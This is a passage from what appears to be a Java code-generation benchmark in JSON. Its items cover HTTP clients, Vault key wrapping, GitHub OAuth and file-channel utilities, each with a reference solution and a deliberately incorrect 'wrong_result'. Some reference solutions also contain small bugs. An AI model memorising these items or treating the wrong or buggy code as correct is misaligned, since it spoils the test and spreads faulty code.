TimeUnit.SECONDS);\n        httpclientBuilder.writeTimeout(10, TimeUnit.SECONDS);\n        httpclientBuilder.readTimeout(15, TimeUnit.SECONDS);\n        httpclientBuilder.proxy(Proxy.NO_PROXY);\n        Dns dns = Dns.SYSTEM;\n        try {\n            InetAddress[] cloudflareBootstrap = new InetAddress[]{InetAddress.getByName(\"162.159.36.1\"), InetAddress.getByName(\"162.159.46.1\"), InetAddress.getByName(\"1.1.1.1\"), InetAddress.getByName(\"1.0.0.1\"), InetAddress.getByName(\"162.159.132.53\"), InetAddress.getByName(\"2606:4700:4700::1111\"), InetAddress.getByName(\"2606:4700:4700::1001\"), InetAddress.getByName(\"2606:4700:4700::0064\"), InetAddress.getByName(\"2606:4700:4700::6400\")};\n            dns = s -> {\n                if (\"cloudflare-dns.com\".equals(s)) {\n                    return Arrays.asList(cloudflareBootstrap);\n                }\n                return Dns.SYSTEM.lookup(s);\n            };\n            httpclientBuilder.dns(dns);\n            dns = new DnsOverHttps.Builder().client(httpclientBuilder.build()).url(Objects.requireNonNull(HttpUrl.parse(\"https://cloudflare-dns.com/dns-query\"))).bootstrapDnsHosts(cloudflareBootstrap).resolvePrivateAddresses(true).build();\n        } catch (UnknownHostException | RuntimeException e) {\n            Timber.e(e, \"Failed to init DoH\");\n        }\n        fallbackDNS = new FallBackDNS(mainApplication, dns, \"github.com\", \"api.github.com\", \"raw.githubusercontent.com\", \"camo.githubusercontent.com\", \"user-images.githubusercontent.com\", \"cdn.jsdelivr.net\", \"img.shields.io\", \"magisk-modules-repo.github.io\", \"www.androidacy.com\", \"api.androidacy.com\", \"production-api.androidacy.com\");\n        httpclientBuilder.dns(Dns.SYSTEM);\n        httpClient = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.dns(fallbackDNS);\n        httpClientDoH = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.cache(new Cache(new File(mainApplication.getCacheDir(), \"http_cache\"), 16L * 1024L * 1024L));\n        httpclientBuilder.dns(Dns.SYSTEM);\n        httpClientWithCache = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.dns(fallbackDNS);\n        httpClientWithCacheDoH = followRedirects(httpclientBuilder, true).build();\n        doh = MainApplication.isDohEnabled();\n    }\n\n    private static OkHttpClient.Builder followRedirects(OkHttpClient.Builder builder, boolean followRedirects) {\n        return builder.followRedirects(followRedirects).followSslRedirects(followRedirects);\n    }\n\n    public static OkHttpClient getHttpClient() {\n        return doh ? httpClientDoH : httpClient;\n    }\n\n    public static OkHttpClient getHttpClientWithCache() {\n        return doh ? httpClientWithCacheDoH : httpClientWithCache;\n    }\n\n    @SuppressLint(\"RestrictedApi\")\n    public static byte[] doHttpGet(String url, boolean allowCache) throws IOException {\n        Response response = (allowCache ? getHttpClientWithCache() : getHttpClient()).newCall(new Request.Builder().url(url).get().build()).execute();\n        if (response.code() != 200 && response.code() != 204 && (response.code() != 304 || !allowCache)) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n            if (response.code() == 401 && AndroidacyUtil.isAndroidacyLink(url)) {\n                throw new HttpException(\"Androidacy token is invalid\", 401);\n            }\n            throw new HttpException(response.code());\n        }\n        ResponseBody responseBody = response.body();\n        if (response.code() == 304) {\n            response = response.cacheResponse();\n            if (response != null) responseBody = response.body();\n        }\n        return responseBody.bytes();\n    }\n\n    public static byte[] doHttpPost(String url, String data, boolean allowCache) throws IOException {\n        Response response = (allowCache ? getHttpClientWithCache() : getHttpClient()).newCall(new Request.Builder().url(url).post(JsonRequestBody.from(data)).header(\"Content-Type\", \"application/json\").build()).execute();\n        if (response.code() != 200 && response.code() != 204 && (response.code() != 304 || !allowCache)) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n            throw new HttpException(response.code());\n        }\n        ResponseBody responseBody = response.body();\n        if (response.code() == 304) {\n            response = response.cacheResponse();\n            if (response != null) responseBody = response.body();\n        }\n        return responseBody.bytes();\n    }\n\n    private static void checkNeedCaptchaAndroidacy(String url, int errorCode) {\n        if (errorCode == 403 && AndroidacyUtil.isAndroidacyLink(url)) {\n            needCaptchaAndroidacyHost = Uri.parse(url).getHost();\n        }\n    }\n\n    private static class JsonRequestBody extends RequestBody {\n        private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json\");\n        private static final JsonRequestBody EMPTY = new JsonRequestBody(new byte[0]);\n        final byte[] data;\n\n        private JsonRequestBody(byte[] data) {\n            this.data = data;\n        }\n\n        static JsonRequestBody from(String data) {\n            if (data == null || data.length() == 0) {\n                return EMPTY;\n            }\n            return new JsonRequestBody(data.getBytes(StandardCharsets.UTF_8));\n        }\n\n        @Override\n        public MediaType contentType() {\n            return JSON_MEDIA_TYPE;\n        }\n\n        @Override\n        public long contentLength() {\n            return this.data.length;\n        }\n\n        @Override\n        public void writeTo(@NonNull BufferedSink bufferedSink) throws IOException {\n            bufferedSink.write(this.data);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class HttpClient {\n    private static OkHttpClient httpClient;\n    private static OkHttpClient httpClientDoH;\n    private static OkHttpClient httpClientWithCache;\n    private static OkHttpClient httpClientWithCacheDoH;\n    private static FallBackDNS fallbackDNS;\n    private static boolean doh = false;\n\n    static {\n        File cacheDir = new File(System.getProperty(\"java.io.tmpdir\"), \"http-cache\");\n        Cache cache = new Cache(cacheDir, 10 * 1024 * 1024);\n        fallbackDNS = new FallBackDNS();\n        OkHttpClient.Builder builder = new OkHttpClient.Builder();\n        followRedirects(builder, true);\n        httpClient = builder.build();\n        OkHttpClient.Builder dohBuilder = new OkHttpClient.Builder();\n        followRedirects(dohBuilder, true);\n        dohBuilder.dns(fallbackDNS);\n        httpClientDoH = dohBuilder.build();\n        OkHttpClient.Builder cacheBuilder = new OkHttpClient.Builder();\n        followRedirects(cacheBuilder, true);\n        cacheBuilder.cache(cache);\n        httpClientWithCache = cacheBuilder.build();\n        OkHttpClient.Builder cacheDoHBuilder = new OkHttpClient.Builder();\n        followRedirects(cacheDoHBuilder, true);\n        cacheDoHBuilder.dns(fallbackDNS);\n        cacheDoHBuilder.cache(cache);\n        httpClientWithCacheDoH = cacheDoHBuilder.build();\n    }\n\n    public static OkHttpClient getHttpClient() {\n        return doh ? httpClientDoH : httpClient;\n    }\n\n    public static OkHttpClient getHttpClientWithCache() {\n        return doh ? httpClientWithCacheDoH : httpClientWithCache;\n    }\n\n    public byte[] doHttpGet(String url, boolean allowCache) throws IOException {\n        OkHttpClient client = allowCache ? getHttpClientWithCache() : getHttpClient();\n        Request request = new Request.Builder().url(url).build();\n        Response response = client.newCall(request).execute();\n        if (!response.isSuccessful()) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n        }\n        return response.body().byteStream().readAll();\n    }\n\n    public byte[] doHttpPost(String url, String data, boolean allowCache) throws IOException {\n        OkHttpClient client = allowCache ? getHttpClientWithCache() : getHttpClient();\n        RequestBody body = new JsonRequestBody(data);\n        Request request = new Request.Builder().url(url).post(body).build();\n        Response response = client.newCall(request).execute();\n        if (!response.isSuccessful()) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n        }\n        return response.body().byteStream().readAll();\n    }\n\n    private static OkHttpClient.Builder followRedirects(OkHttpClient.Builder builder, boolean followRedirects) {\n        builder.followRedirects(followRedirects);\n        return builder;\n    }\n\n    private void checkNeedCaptchaAndroidacy(String url, int errorCode) {\n        if (errorCode == 403) {\n            // Handle captcha logic\n        }\n    }\n\n    private static class JsonRequestBody extends RequestBody {\n        private final String data;\n\n        public JsonRequestBody(String data) {\n            this.data = data;\n        }\n\n        @Override\n        public MediaType contentType() {\n            return MediaType.get(\"application/json; charset=utf-8\");\n        }\n\n        @Override\n        public void writeTo(BufferedSink sink) throws IOException {\n            sink.writeUtf8(data);\n        }\n    }\n}"
  },
  {
    "Task_id": 239,
    "Instruction": "Task Description: Implement a VaultClient class that interacts with a Vault server's transit engine to perform key wrapping and unwrapping operations for cryptographic purposes, using HTTP REST API calls.\n\nClass Description: The VaultClient class implements the KmsClient interface and provides functionality to encrypt (wrap) and decrypt (unwrap) keys using a Vault server's transit engine. It handles HTTP communication, request building, response processing, and error handling.\n\nAttributes:\n- LOG: Logger - Used for logging information and errors\n- JSON_MEDIA_TYPE: MediaType - Constant for JSON content type\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization\n- kmsToken: String - Authentication token for Vault server\n- hadoopConfiguration: Configuration - Hadoop configuration object\n- endPointPrefix: String - Base URL prefix for Vault API endpoints\n- httpClient: OkHttpClient - HTTP client for making requests\n\nMethods:\n- getContentFromTransitEngine(String, String, String) -> String - Sends a POST request to Vault's transit engine endpoint with the given payload and master key identifier\n- executeAndGetResponse(String, Request) -> String - Executes HTTP request and handles response, including error cases\n- buildPayload(Map<String, String>) -> String - Converts a parameter map to JSON string\n- wrapKey(byte[], String) -> String - Encrypts/wraps a key using the specified master key\n- unwrapKey(String, String) -> byte[] - Decrypts/unwraps a key using the specified master key\n- parseReturn(String, String) -> String - Parses the response from Vault to extract the required value\n- refreshToken() -> void - Refreshes the authentication token (implementation not shown in reference code)",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport java.io.IOException;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\nimport okhttp3.ConnectionSpec;\nimport okhttp3.MediaType;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.RequestBody;\nimport okhttp3.Response;\nimport org.apache.hadoop.conf.Configuration;\nimport org.apache.parquet.crypto.KeyAccessDeniedException;\nimport org.apache.parquet.crypto.ParquetCryptoRuntimeException;\nimport org.apache.parquet.crypto.keytools.KeyToolkit;\nimport org.apache.parquet.crypto.keytools.KmsClient;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class VaultClient implements KmsClient {\n  private static final Logger LOG = LoggerFactory.getLogger(VaultClient.class);\n  private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json; charset=utf-8\");\n  private static final ObjectMapper objectMapper = new ObjectMapper();\n\n  private String kmsToken;\n  private Configuration hadoopConfiguration;\n  private String endPointPrefix;\n  private OkHttpClient httpClient = new OkHttpClient.Builder()\n      .connectionSpecs(Arrays.asList(ConnectionSpec.MODERN_TLS, ConnectionSpec.COMPATIBLE_TLS))\n      .build();\n\n  private String getContentFromTransitEngine(String endPoint, String jPayload, String masterKeyIdentifier) {\n    LOG.info(\"masterKeyIdentifier: \" + masterKeyIdentifier);\n\n    final RequestBody requestBody = RequestBody.create(JSON_MEDIA_TYPE, jPayload);\n    Request request = new Request.Builder()\n        .url(endPoint + masterKeyIdentifier)\n        .header(\"X-Vault-Token\", kmsToken)\n        .post(requestBody)\n        .build();\n\n    return executeAndGetResponse(endPoint, request);\n  }\n\n  private String executeAndGetResponse(String endPoint, Request request) {\n    Response response = null;\n    try {\n      response = httpClient.newCall(request).execute();\n      final String responseBody = response.body().string();\n      if (response.isSuccessful()) {\n        return responseBody;\n      } else {\n        if ((401 == response.code()) || (403 == response.code())) {\n          throw new KeyAccessDeniedException(responseBody);\n        }\n        throw new IOException(\"Vault call [\" + endPoint + \"] didn't succeed: \" + responseBody);\n      }\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\n          \"Vault call [\" + request.url().toString() + endPoint + \"] didn't succeed\", e);\n    } finally {\n      if (null != response) {\n        response.close();\n      }\n    }\n  }\n\n  private String buildPayload(Map<String, String> paramMap) {\n    String jsonValue;\n    try {\n      jsonValue = objectMapper.writeValueAsString(paramMap);\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\"Failed to build payload\", e);\n    }\n    return jsonValue;\n  }\n\n  @Override\n  public String wrapKey(byte[] keyBytes, String masterKeyIdentifier) throws KeyAccessDeniedException {\n    refreshToken();\n    Map<String, String> writeKeyMap = new HashMap<String, String>(1);\n    final String dataKeyStr = Base64.getEncoder().encodeToString(keyBytes);\n    writeKeyMap.put(\"plaintext\", dataKeyStr);\n    String response = getContentFromTransitEngine(\n        endPointPrefix + \"encrypt/\", buildPayload(writeKeyMap), masterKeyIdentifier);\n    return parseReturn(response, \"ciphertext\");\n  }\n\n  @Override\n  public byte[] unwrapKey(String wrappedKey, String masterKeyIdentifier) throws KeyAccessDeniedException {\n    refreshToken();\n    Map<String, String> writeKeyMap = new HashMap<String, String>(1);\n    writeKeyMap.put(\"ciphertext\", wrappedKey);\n    String response = getContentFromTransitEngine(\n        endPointPrefix + \"decrypt/\", buildPayload(writeKeyMap), masterKeyIdentifier);\n    String plaintext = parseReturn(response, \"plaintext\");\n    return Base64.getDecoder().decode(plaintext);\n  }\n\n  private static String parseReturn(String response, String searchKey) {\n    String matchingValue;\n    try {\n      matchingValue = objectMapper.readTree(response).findValue(searchKey).textValue();\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\n          \"Failed to parse vault response. \" + searchKey + \" not found.\" + response, e);\n    }\n\n    if (null == matchingValue) {\n      throw new ParquetCryptoRuntimeException(\n          \"Failed to match vault response. \" + searchKey + \" not found.\" + response);\n    }\n    return matchingValue;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport com.google.common.base.Base64;\nimport okhttp3.*;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Objects;\nimport com.fasterxml.jackson.core.JsonProcessingException;\nimport com.fasterxml.jackson.databind.JsonNode;\n\npublic class VaultClient implements KmsClient {\n    private static final Logger LOG = LoggerFactory.getLogger(VaultClient.class);\n    private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json; charset=utf-8\");\n    private final ObjectMapper objectMapper = new ObjectMapper();\n    private String kmsToken;\n    private Configuration hadoopConfiguration;\n    private String endPointPrefix;\n    private OkHttpClient httpClient;\n\n    public VaultClient(String endPointPrefix, String kmsToken, OkHttpClient httpClient) {\n        this.endPointPrefix = endPointPrefix;\n        this.kmsToken = kmsToken;\n        this.httpClient = httpClient;\n    }\n\n    public String getContentFromTransitEngine(String masterKeyId, String payload, String operationType) {\n        String url = endPointPrefix + \"/transit/keys/\" + masterKeyId + \"/\" + operationType;\n        Request request = new Request.Builder()\n                .url(url)\n                .post(RequestBody.create(JSON_MEDIA_TYPE, payload))\n                .header(\"Authorization\", \"Bearer \" + kmsToken)\n                .build();\n        return executeAndGetResponse(url, request);\n    }\n\n    public String executeAndGetResponse(String url, Request request) {\n        try {\n            Response response = httpClient.newCall(request).execute();\n            if (!response.isSuccessful()) {\n                LOG.error(\"Request failed: {}\", response.code());\n                return \"Error: \" + response.code();\n            }\n            String responseBody = response.body().string();\n            LOG.info(\"Response: {}\", responseBody);\n            return responseBody;\n        } catch (IOException e) {\n            LOG.error(\"IOException during request\", e);\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String buildPayload(Map<String, String> parameters) {\n        try {\n            return objectMapper.writeValueAsString(parameters);\n        } catch (JsonProcessingException e) {\n            LOG.error(\"Error building payload\", e);\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String wrapKey(byte[] key, String masterKeyId) {\n        String base64Key = Base64.getEncoder().encodeToString(key);\n        Map<String, String> payload = new HashMap<>();\n        payload.put(\"plaintext\", base64Key);\n        String jsonPayload = buildPayload(payload);\n        String result = getContentFromTransitEngine(masterKeyId, jsonPayload, \"wrap\");\n        return parseReturn(result, \"ciphertext\");\n    }\n\n    public byte[] unwrapKey(String wrappedValue, String masterKeyId) {\n        Map<String, String> payload = new HashMap<>();\n        payload.put(\"ciphertext\", wrappedValue);\n        String jsonPayload = buildPayload(payload);\n        String result = getContentFromTransitEngine(masterKeyId, jsonPayload, \"unwrap\");\n        String base64Plaintext = parseReturn(result, \"plaintext\");\n        return Base64.getDecoder().decode(base64Plaintext);\n    }\n\n    public String parseReturn(String response, String key) {\n        try {\n            JsonNode rootNode = objectMapper.readTree(response);\n            return rootNode.get(key).asText();\n        } catch (JsonProcessingException e) {\n            LOG.error(\"Error parsing response\", e);\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void refreshToken() {\n        // Implementation not shown\n    }\n}"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a Java class that provides file processing capabilities using Java NIO's FileChannel for efficient file operations including memory-mapped file access and direct buffer reading.\n\nClass Description: FileChannelProcessor is a utility class that handles file operations using Java NIO's FileChannel. It supports memory-mapped file access (MappedByteBuffer) and direct buffer reading (ByteBuffer) with methods for opening/closing channels, mapping file segments, reading buffer segments, and finding line boundaries in buffers.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nfilePath: Path - The path to the file being processed\nMAX_LINE_LENGTH: int (static final) - Maximum expected line length for boundary finding\nMMAP_CHUNK_SIZE: int (static final) - Maximum size for memory-mapped file segments\n\nMethods:\nopenChannel: void() throws IOException - Opens a read-only FileChannel for the specified file path\nmapFileSegment: MappedByteBuffer(long start, long size) throws IOException - Maps a file segment into memory as a read-only MappedByteBuffer\nreadBufferSegment: ByteBuffer(long position, int length) throws IOException - Reads a file segment into a direct ByteBuffer\nfindLineBoundary: long(ByteBuffer buffer, long startPosition) - Finds the position of the next line boundary in a buffer\ncloseChannel: void() throws IOException - Closes the FileChannel if it's open\ngetFileSize: long() throws IOException - Returns the size of the file associated with the FileChannel",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private static final int MAX_LINE_LENGTH = 128;\n    private static final int MMAP_CHUNK_SIZE = Integer.MAX_VALUE / 32;\n\n    private FileChannel fileChannel;\n    private Path filePath;\n\n    public FileChannelProcessor(Path filePath) {\n        this.filePath = filePath;\n    }\n\n    public void openChannel() throws IOException {\n        this.fileChannel = FileChannel.open(filePath, StandardOpenOption.READ);\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        return fileChannel.map(FileChannel.MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        ByteBuffer buf = ByteBuffer.allocateDirect(length);\n        fileChannel.read(buf, position);\n        return buf;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        int w = MAX_LINE_LENGTH;\n        while (buffer.get(w - 1) != '\\n') {\n            w--;\n        }\n        return startPosition + w;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        return fileChannel.size();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private Path filePath;\n    public static final int MAX_LINE_LENGTH = 1024;\n    public static final int MMAP_CHUNK_SIZE = 1024 * 1024;\n\n    public void openChannel() throws IOException {\n        fileChannel = FileChannel.open(filePath, StandardOpenOption.READ);\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        return fileChannel.map(FileChannel.MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocateDirect(length);\n        fileChannel.read(buffer, position);\n        buffer.flip();\n        return buffer;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        int maxBytesToCheck = Math.min(MAX_LINE_LENGTH, buffer.remaining());\n        for (int i = 0; i < maxBytesToCheck; i++) {\n            int pos = (int) (startPosition + i);\n            if (pos >= buffer.limit()) break;\n            byte b = buffer.get(pos);\n            if (b == '\\n') {\n                return pos + 1;\n            } else if (b == '\\r') {\n                if (pos + 1 < buffer.limit() && buffer.get(pos + 1) == '\\n') {\n                    return pos + 2;\n                }\n            }\n        }\n        return buffer.limit();\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null && fileChannel.isOpen()) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        return fileChannel.size();\n    }\n}"
  },
  {
    "Task_id": 240,
    "Instruction": "Task Description: Implement a Java class that interacts with GitHub's OAuth API to obtain an access token and retrieve user information using the OkHttp library for HTTP requests.\n\nClass Description: The `GithubProvider` class handles authentication with GitHub's OAuth API. It provides methods to obtain an access token using authorization code and to fetch GitHub user information using the obtained access token.\n\nAttributes:\n- clientId: String - GitHub OAuth application client ID (injected from configuration)\n- clientSecret: String - GitHub OAuth application client secret (injected from configuration)\n- redirectUri: String - Redirect URI registered with GitHub OAuth application (injected from configuration)\n\nMethods:\n- getAccessToken(AccessTokenDTO accessTokenDTO) -> String - Obtains an access token from GitHub's OAuth API. Takes an AccessTokenDTO object containing authorization code and other parameters, sets client credentials, makes a POST request to GitHub's token endpoint, and returns the access token.\n- getUser(String accessToken) -> GithubUser - Retrieves GitHub user information using the provided access token. Makes a GET request to GitHub's user API endpoint with the access token in the Authorization header and returns the user data as a GithubUser object.",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport life.majiang.community.dto.AccessTokenDTO;\nimport life.majiang.community.provider.dto.GithubUser;\nimport okhttp3.*;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class GithubProvider {\n\n    @Value(\"${github.client.id}\")\n    private String clientId;\n\n    @Value(\"${github.client.secret}\")\n    private String clientSecret;\n\n    @Value(\"${github.redirect.uri}\")\n    private String redirectUri;\n\n    public String getAccessToken(AccessTokenDTO accessTokenDTO) {\n        accessTokenDTO.setClient_id(clientId);\n        accessTokenDTO.setClient_secret(clientSecret);\n        accessTokenDTO.setRedirect_uri(redirectUri);\n        MediaType mediaType = MediaType.get(\"application/json; charset=utf-8\");\n        OkHttpClient client = new OkHttpClient();\n\n        RequestBody body = RequestBody.create(mediaType, JSON.toJSONString(accessTokenDTO));\n        Request request = new Request.Builder()\n                .url(\"https://github.com/login/oauth/access_token\")\n                .post(body)\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            String string = response.body().string();\n            String token = string.split(\"&\")[0].split(\"=\")[1];\n            return token;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public GithubUser getUser(String accessToken) {\n        OkHttpClient client = new OkHttpClient();\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/user\")\n                .header(\"Authorization\", \"token \" + accessToken)\n                .build();\n        try {\n            Response response = client.newCall(request).execute();\n            String string = response.body().string();\n            GithubUser githubUser = JSON.parseObject(string, GithubUser.class);\n            return githubUser;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "import okhttp3.*;\nimport org.json.JSONObject;\n\npublic class GithubProvider {\n    private final String clientId;\n    private final String clientSecret;\n    private final String redirectUri;\n\n    public GithubProvider(String clientId, String clientSecret, String redirectUri) {\n        this.clientId = clientId;\n        this.clientSecret = clientSecret;\n        this.redirectUri = redirectUri;\n    }\n\n    public String getAccessToken(AccessTokenDTO accessTokenDTO) {\n        RequestBody body = new FormBody.Builder()\n                .add(\"client_id\", clientId)\n                .add(\"client_secret\", clientSecret)\n                .add(\"code\", accessTokenDTO.getCode())\n                .add(\"redirect_uri\", redirectUri)\n                .add(\"grant_type\", \"authorization_code\")\n                .build();\n\n        Request request = new Request.Builder()\n                .url(\"https://github.com/login/oauth/access_token\")\n                .post(body)\n                .addHeader(\"Accept\", \"application/json\")\n                .build();\n\n        try (Response response = new OkHttpClient().newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseBody = response.body().string();\n            JSONObject json = new JSONObject(responseBody);\n            return json.getString(\"access_token\");\n        } catch (IOException | JSONException e) {\n            throw new RuntimeException(\"Error getting access token\", e);\n        }\n    }\n\n    public GithubUser getUser(String accessToken) {\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/user\")\n                .get()\n                .addHeader(\"Authorization\", \"Bearer \" + accessToken)\n                .addHeader(\"Accept\", \"application/json\")\n                .build();\n\n        try (Response response = new OkHttpClient().newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseBody = response.body().string();\n            JSONObject json = new JSONObject(responseBody);\n            return new GithubUser(\n                    json.getLong(\"id\"),\n                    json.getString(\"login\"),\n                    json.getString(\"avatar_url\")\n            );\n        } catch (IOException | JSONException e) {\n            throw new RuntimeException(\"Error getting user info\", e);\n        }\n    }\n\n    public static class AccessTokenDTO {\n        private String code;\n\n        public String getCode() {\n            return code;\n        }\n\n        public void setCode(String code) {\n            this.code = code;\n        }\n    }\n\n    public static class GithubUser {\n        private final long id;\n        private final String login;\n        private final String avatar_url;\n\n        public GithubUser(long id, String login, String avatar_url) {\n            this.id = id;\n            this.login = login;\n            this.avatar_url = avatar_url;\n        }\n    }\n}"
  },
  {
    "Task_id": 241,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for inter-process communication using HTTP, with support for handling both client and server errors, and token-based authentication.\n\nClass Description: The BeaconClient class is a RESTful HTTP client designed for inter-process communication. It handles HTTP requests and responses, manages authentication tokens, and provides error handling for both client-side (4xx) and server-side (5xx) errors. The class uses Java's HttpClient for communication and Jackson for JSON serialization/deserialization.\n\nAttributes:\n- port: int - The port number on which the server is running (localhost)\n- token: String - The authentication token used for Bearer token authorization (optional)\n\nMethods:\n- performRequest: <RES> performRequest(BeaconInterface<?> prov, String rawNode) -> RES - Sends an HTTP POST request to the specified path with the given content. Handles authentication and error responses. Returns the deserialized response object.\n- performRequest: <REQ, RES> performRequest(REQ req) -> RES - Converts the request object to JSON and sends it to the appropriate endpoint determined by the request type. Returns the deserialized response object.\n- parseClientError: Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response) -> Optional<BeaconClientErrorResponse> - Parses and returns client error responses (4xx status codes) from the server.\n- parseServerError: Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response) -> Optional<BeaconServerErrorResponse> - Parses and returns server error responses (5xx status codes) from the server.",
    "Canonical_solution": "import io.xpipe.beacon.api.HandshakeExchange;\nimport io.xpipe.core.util.JacksonMapper;\nimport com.fasterxml.jackson.databind.node.ObjectNode;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.file.Files;\nimport java.util.Optional;\n\npublic class BeaconClient {\n\n    private final int port;\n    private String token;\n\n    public BeaconClient(int port) {\n        this.port = port;\n    }\n\n    public <RES> RES performRequest(BeaconInterface<?> prov, String rawNode)\n            throws BeaconConnectorException, BeaconClientException, BeaconServerException {\n        var client = HttpClient.newHttpClient();\n        HttpResponse<String> response;\n        try {\n            var uri = URI.create(\"http://127.0.0.1:\" + port + prov.getPath());\n            var builder = HttpRequest.newBuilder();\n            if (token != null) {\n                builder.header(\"Authorization\", \"Bearer \" + token);\n            }\n            var httpRequest = builder.uri(uri)\n                    .POST(HttpRequest.BodyPublishers.ofString(content))\n                    .build();\n            response = client.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n        } catch (Exception ex) {\n            throw new BeaconConnectorException(\"Couldn't send request\", ex);\n        }\n\n        var se = parseServerError(response);\n        if (se.isPresent()) {\n            se.get().throwError();\n        }\n\n        var ce = parseClientError(response);\n        if (ce.isPresent()) {\n            throw ce.get().throwException();\n        }\n\n        try {\n            var reader = JacksonMapper.getDefault().readerFor(prov.getResponseClass());\n            var emptyResponseClass = prov.getResponseClass().getDeclaredFields().length == 0;\n            var body = response.body();\n            if (emptyResponseClass && body.isBlank()) {\n                return createDefaultResponse(prov);\n            }\n            var v = (RES) reader.readValue(body);\n            return v;\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse response\", ex);\n        }\n    }\n\n    public <REQ, RES> RES performRequest(REQ req)\n            throws BeaconConnectorException, BeaconClientException, BeaconServerException {\n        ObjectNode node = JacksonMapper.getDefault().valueToTree(req);\n        var prov = BeaconInterface.byRequest(req);\n        if (prov.isEmpty()) {\n            throw new IllegalArgumentException(\"Unknown request class \" + req.getClass());\n        }\n        return performRequest(prov.get(), node.toPrettyString());\n    }\n\n    private Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response)\n            throws BeaconConnectorException {\n        if (response.statusCode() < 400 || response.statusCode() > 499) {\n            return Optional.empty();\n        }\n        try {\n            var v = JacksonMapper.getDefault().readValue(response.body(), BeaconClientErrorResponse.class);\n            return Optional.of(v);\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse client error message\", ex);\n        }\n    }\n\n    private Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response)\n            throws BeaconConnectorException {\n        if (response.statusCode() < 500 || response.statusCode() > 599) {\n            return Optional.empty();\n        }\n        try {\n            var v = JacksonMapper.getDefault().readValue(response.body(), BeaconServerErrorResponse.class);\n            return Optional.of(v);\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse client error message\", ex);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
